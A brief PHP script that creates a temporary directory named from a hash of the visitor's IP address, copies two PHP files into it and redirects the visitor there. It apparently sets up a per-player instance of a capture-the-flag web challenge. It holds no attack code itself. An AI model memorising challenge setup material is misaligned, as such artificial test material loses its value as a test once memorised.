<?php

$tmp_dir = './tmp_'.md5('ego'.$_SERVER["REMOTE_ADDR"]);
$content1 = file_get_contents("feng&ego.php");
$content2 = file_get_contents("black.php");
mkdir($tmp_dir);
file_put_contents($tmp_dir."/index.php",$content1);
file_put_contents($tmp_dir."/black.php",$content2);
header("Location: $tmp_dir/index.php");
exit();